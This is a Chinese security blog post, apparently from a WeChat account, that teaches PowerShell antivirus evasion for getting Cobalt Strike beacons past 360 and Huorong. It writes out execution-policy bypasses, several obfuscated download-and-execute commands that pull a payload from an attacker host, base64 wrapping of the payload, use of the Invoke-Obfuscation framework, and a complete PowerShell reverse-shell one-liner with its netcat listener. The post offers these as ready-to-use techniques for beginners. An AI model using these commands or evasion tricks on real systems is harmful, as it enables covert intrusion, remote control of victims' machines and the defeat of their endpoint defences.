> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650516762&idx=2&sn=b8f8f1ce9ec615d25f38d1a3d0ad2348&chksm=83bac8feb4cd41e8d8970ce11b52f4fdeefc06b3120c73146d87d83e6eae0d71ba75e84cd723&mpshare=1&scene=1&srcid=0708rBMmt3aQfbccZU0EdOiD&sharer_sharetime=1625734304006&sharer_shareid=7fece245937ac96f04f0fb8e1311fff1#rd)

> 文章来源： 花指令安全实验室 Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用

> **文章来****源****：** **花指令安全实验室**

Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework 的强大功能。powershell 一直都是内网渗透的大热门，微软是真正的在推行 PowerShell，包括 Office 等更多自家软件，底层都是调用 PowerShell 来实现，近年来利用 powershell 来搞内网渗透进行横向或免杀的热度一直居高不下。

这次我将结合前人的各种骚操作，以及个人的不断试错，所想所思，来写一篇关于 powershell 来进行免杀，达到 CS 多种姿势绕过 AV 上线的干货文章，并且本文章尽力内容友好易懂，没接触过 powershell 的小白也可以实现免杀上线，拥有自己的一些 bypass 小技巧

**0****1**

  

实验环境：

一台 WIN7 专业版     360 全家桶         火绒最新版本

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxibj52tZDRmichVnBSpEibH0OTJl5Riam3QJSIBfffJMia13JFxN3wMhA2Kg/640?wx_fmt=png)

### 02. Powershell 执行策略问题：

首先我们要来了解一下 powershell 执行策略这一块的基础问题：

powershell 有六种执行策略：

> `Unrestricted` 权限最高，可以不受限制执行任意脚本
> 
> `Restricted` 默认策略，不允许任意脚本的执行
> 
> `AllSigned` 所有脚本必须经过签名运行
> 
> `RemoteSigned` 本地脚本无限制，但是对来自网络的脚本必须经过签名
> 
> `Bypass` 没有任何限制和提示
> 
> `Undefined` 没有设置脚本的策略

那么 windows 默认的执行策略是`Restricted`，他是不允许任意脚本的执行

我们来查查当前目标机器的执行策略：

进入 powershell 查看执行策略 ：Get-ExecutionPolicy

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxxwOwEWoIaiaWPMu86xnDickLwaHoBNwCJq8Mve4F05mqD0giaKrkNtpfg/640?wx_fmt=png)

可以看到，此时我们运行保存好的 tubai.ps1 文件，当前策略是默认不允许执行脚本的

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxjfbib5L1MU0avayfefzic52dTMFH9XxRnofgXwjxXNcWcibxbzm1k2Urg/640?wx_fmt=png)

我们可以用管理员权限来修改默认执行策略，来达到执行我们 ps1 脚本的效果  

Set-ExecutionPolicy Unrestricted（权限最高，可以不受限制执行任意脚本）设置执行策略

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx8FzJYeP0X2KZHVe63RQJUXDVxYTOpBE2GJgj1kY1CJa3qq0PNGUCBg/640?wx_fmt=png)

此时执行便不在报错，成功执行我们的脚本

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxFp53CZ7ReWRibCiaSFzIx9iaO0bpqVXmSibRFpI81yicxQhKRtgbuGUUGiaw/640?wx_fmt=png)

### 03. 绕过执行策略：

当然我们在渗透中，遇到执行策略配置是默认不执行的，我们再去通过管理员权限去修改就太鸡肋，动作太大了，所以便有了绕过执行策略，去执行我们的脚本以及 powershell 命令，下面来介绍几种常见的绕过方式。

为便于演示，我们再次将执行策略设为默认不允许任意脚本的执行

Get-ExecutionPolicy `Restricted`

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx9Om47yVQiaBvlhZF0vgLrZ43m3KYelEbN5ib4NKNcCBlhpYUzUAsibuTQ/640?wx_fmt=png)

第一种:

以文件落地为例：

**本地读取然后通过管道符运行  
**

```
powershell Get-Content tubai.ps1 | powershell -NoProfile -

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxdXl2jXJV7FK03NjNkxYV1ucgDrBJwflYibJI5IFKT5BDPI2vGsADhkQ/640?wx_fmt=png)**Bypass 执行策略绕过  
**

powershell -ExecutionPolicy bypass -File ./tubai.ps1  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxxVeMgQR6ibm2OqfLE3kwQAYovZkMS1cNjfibic3fZF8TqUcJKmicFmjDQw/640?wx_fmt=png)  

**Unrestricted 执行策略标志  
**

**powershell -ExecutionPolicy unrestricted -File ./tubai.ps1  
**

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxaHCRvrfWJrD8PyJnuV2kOqJppYyBRjBvL25DBSTY2U0jWd4qr7rQ4w/640?wx_fmt=png)

可以看到以上 bypass 方式均成功绕过执行策略。  

以文件不落地为例：

**远程下载并通过 IEX 运行脚本  
**

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.52.23:80/a'))"

```

这个下面的绕过思路会细谈。

### 04. Powershell 命令混淆绕过 AV 上线：

我们直接 cs 生成

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxaX0npb1sMQv5k5O0HM3gGUEBpUPVrlCFqicJia7Ex1G5MgqsSm7EPtKg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxjRP3KAARKicMkgDQd9FUY8rqia96HBWKFtzMawjiacRuBibjic9BMERHzzQ/640?wx_fmt=png)

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.52.23:80/a'))"

```

这条命令主要做了哪些事？

利用 downloadstri 远程读取 powershell 文件并 iex 执行, 即 http://192.168.52.23:80/a 下的文件。

iex => Invoke-expression  将字符串当作 powershell 代码执行

我们直接在目标机运行发现被拦截：

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxdZMLexx8icTVFMIL9B9XNm2noqEW7qmeqk7Ql9RfzTkiavAMRxTiaJgsA/640?wx_fmt=png)

那我我们可以根据 powershell 语言的特性进行混淆，例如字符串转换、变量转换、编码、压缩等等来绕过 AV 达到上线  

1.  为 iex 设置别名
    

```
powershell set-alias -name cseroad -value Invoke-Expression;cseroad(New-Object Net.WebClient).DownloadString('http://192.168.52.23:80/a')

```

目标机器无拦截，绕过 360 与火绒成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxYI355C0WJxvmx1qluC5vKP6soFHPPe4r5icYZu5saXpgNM0uWvVEfPg/640?wx_fmt=png)

2. 远程下载并通过 IEX 运行脚本, 这里我们采用 echo 方式

```
echo Invoke-Expression(new-object net.webclient).downloadstring('http://192.168.52.23:80/a') | powershell -

```

目标机器无拦截，绕过 360 与火绒成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx20lJET9U3ACWLfbp4eeiaibpmtosHP58hWowHPL0NwW89TOFMN0icEoCg/640?wx_fmt=png)

3. 利用'+'拼接 http 达到上线 (典型的 powershell 语法特性，以变量的方式来拆分 HTTP）

```
powershell  -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://192.168.52.23:80/a')"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx9fZjdZwCSbmdngK0LicLuu1t0xsRqt3O6BLToFgticHWjqUq2tUv9esQ/640?wx_fmt=png)

### 05. Powershell 代码混淆绕过 AV 上线:

首先来生成一个原始的 cs 上的 powershell 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxRYcENKYp0V2eIm2vMS00B3RibBQnpKvod4ViaUuXEs725B1X65obcUCQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxqoyWkWPnehwiaicbuEffCtWfvDeicmmRclPLvZYYpSpia3ZYFVJmhL7gyA/640?wx_fmt=png)

Powershell -ExecutionPolicy Bypass -File ./payload.sp1

在目标机器执行发现被杀  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx9xicgrDib1ZiaTVwaicopr5TQGqibH9RbhQty31LmQ7OMlM1Vwq9ZKum9VA/640?wx_fmt=png)  

那么我们对生成的 payload.ps1 原始代码进行分析

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxATsm4NuofR5398uSf0Ir7Bnv9ZpL2LcLfe1FLTgYibxmBiabXl31XuDA/640?wx_fmt=png)  

可以看到它是把字符串进行加载, 我们来整个进行一个 base64 编码然后在解码后加载

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxr0rUg0hH63iamPrS5SAhC08FcORetWP0nc8KqzWFSwsdZqvtyU5y92A/640?wx_fmt=png)  

解码加载

```
解密后变量=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后变量))

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxWl0hyRVkY8dLj7jib7OYWSph8ic1EK3Riben8QNicjBiaWiaYomf3NgC6JQQ/640?wx_fmt=png)  

此时去执行上线

运行我们修改后的

Powershell -ExecutionPolicy Bypass -File .\payload.sp1

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx2HjPgopf3fY8AdgLBcqzBzRB2911B6QcTicItibSb7K8VleGelDbKUibA/640?wx_fmt=png)

可以看到杀软无反应，绕过了 AV 拦截成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxpZysa2qdD467QmHgtfh3ib93pg5Kbstv6ACCXccDZbJz5eClY6n0EnQ/640?wx_fmt=png)  

### 06. 利用 Invoke-Obfuscation 混淆 Ps 文件实现上线:

https://github.com/danielbohannon/Invoke-Obfuscation

这个 powershell 混淆编码框架, 这也是著名的组织 APT32 (海莲花) 经常使用的一个工具。

还是准备一个 cs 生成的 payload.ps1, 按上面的方式生成即可，不再重复。

1. 我们来装载框架进入 Invoke-Obfuscation

Import-Module ./Invoke-Obfuscation.psd1 

Invoke-Obfuscation  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxQib8jics8LplOYmSrbcE1vwbRGjWibY5cQdN0ibrTPFxe5o7IWMayAcZbg/640?wx_fmt=png)  

2. 接下来设置 ps1 文件进行混淆，按图操作即可

set scriptpath E:\...\Invoke-Obfuscation_PowerShell\payload.ps1 

输入 ENCODING  就会列出以下几种编码方式  

encoding 

1

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfx2LUVhWKS1D6IyibrqQSfst4HIzpEGkRgRDUu90339Pllib1ts60Ddd1w/640?wx_fmt=png)

3. 输出文件: out 2.ps1

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxtT66hVA7AcvT1Q5Xlib9I5D0hOicZiaOtEJj6pe45WS2XyiciaQuWOK9b3g/640?wx_fmt=png)  

4. 接着我们去目标机器运行生成的 2.ps1

去运行上线：./2.ps1

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxMiaemjxZA6cQ9C4Tvq2FbONMfBsydxGhyfL11NM65ibyXK20sW2tByjA/640?wx_fmt=png)

可以看到无拦截

同样执行上线

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxSSzu7RhBRe5nCS1m4KZia74Qm3nicHtzjt8lk8PgYdAotnAicPFJh4N6g/640?wx_fmt=png)  

### 07. 关于 Powershell 在实际应用中的小技巧：

在实际渗透中，对 cmd 的防范比 powershell 更加严格，所以我们在操作中通过弹一个 powershell 出来执行，更加方便安全。

我们在目标机器执行

```
powershell -c "$client = New-Object Net.Sockets.TCPClient('192.168.52.134',7777);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback=(iex $data 2>&1 | Out-String );$sendata =$sendback+'PS >';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendata);$leng=$sendbyte.Length;$stream.Write($sendbyte,0,$leng);$stream.Flush()};$client.Close()"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxOfstKAOZicTUZdfMicEMfGLUhzuBgQ2qRMFMx2ndVT9PRpAEkzbXZGicw/640?wx_fmt=png)  

此时我们 VPS 监听便弹回了一个目标机器 powershell

vps 监听  nc -lvp 7777

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiaNaczlVIa65KW9EjV7zgfxuTtU9O6DkNZL2mSDFLVRAIJv7npGnQc0CfK1BlWXg4ZzQmoaKJBxtw/640?wx_fmt=png)

参考：

https://www.freebuf.com/articles/system/227467.html

https://www.jianshu.com/p/fb078a99e0d8

https://blog.csdn.net/zhangge3663/article/details/111945373

总结：powershell 在内网渗透中应用广泛，远不止免杀与信息收集，以后会出更多的红蓝对抗系列给大家。本文介绍了执行策略问题与绕过策略方式，以及命令混淆与代码混淆来达到绕过 AV 上线的方式，站在前人的肩膀上思考并看问题。各位有任何问题关注我们公众号私信或联系到我即可，大家有兴趣可以和我们一起研究与探讨技术。